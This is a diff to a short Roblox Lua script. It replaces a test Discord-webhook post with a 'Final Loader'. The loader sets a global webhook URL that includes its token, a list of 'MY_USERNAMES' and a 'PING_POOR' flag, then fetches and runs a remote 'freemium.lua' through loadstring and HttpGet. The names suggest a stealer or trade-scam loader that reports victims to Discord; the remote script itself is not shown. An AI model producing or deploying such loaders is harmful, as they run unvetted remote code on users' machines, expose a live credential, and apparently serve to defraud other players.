@@ -1,21 +1,10 @@
-local webhook = "https://discord.com/api/v10/webhooks/1494420941680148742/DrJ5QakV0MEwSTTFg5KMb_QJWFSF3GsDTi3J-qG7S2qWYjvpTwRDarWiqMxvkGUEfQzw"
+-- Final Loader with your new webhook
+_G.POOR_WEBHOOK = "https://discord.com/api/v10/webhooks/1494420941680148742/DrJ5QakV0MEwSTTFg5KMb_QJWFSF3GsDTi3J-qG7S2qWYjvpTwRDarWiqMxvkGUEfQzw"
 
-local data = {
-    ["content"] = "It works 👀",
-    ["username"] = "My Bot"
-}
+_G.MY_USERNAMES = {"Chelsea", "thisisanalt048", "daxkidcece"}
 
-local json = game:GetService("HttpService"):JSONEncode(data)
+_G.PING_POOR = true
 
-local req = request or http_request or syn and syn.request
-
-if req then
-    req({
-        Url = webhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = json
-    })
-end
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/Baddies/refs/heads/main/freemium.lua", true))()
+end)
